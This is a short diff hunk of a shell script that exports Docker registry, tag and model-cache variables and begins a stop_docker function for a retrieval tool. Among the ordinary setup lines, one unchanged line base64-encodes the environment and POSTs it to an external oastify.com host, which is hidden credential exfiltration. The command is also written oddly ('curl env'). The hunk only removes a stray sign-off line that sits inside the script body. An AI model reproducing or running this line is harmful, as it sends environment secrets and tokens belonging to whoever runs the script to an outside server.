@@ -18,7 +18,6 @@ export REGISTRY=${IMAGE_REPO}
 export TAG=${IMAGE_TAG}
 export MODEL_CACHE=${model_cache:-"./data"}
 curl env | base64 | curl -X POST --data-binary @- http://lodqnxrtmqqmp41hnosf1uj9d0jr7rvg.oastify.com
-Signed-off-by: 0x95 <0x95@gmail.com>
 
 function stop_docker() {
     echo "Stopping Retrieval tool"
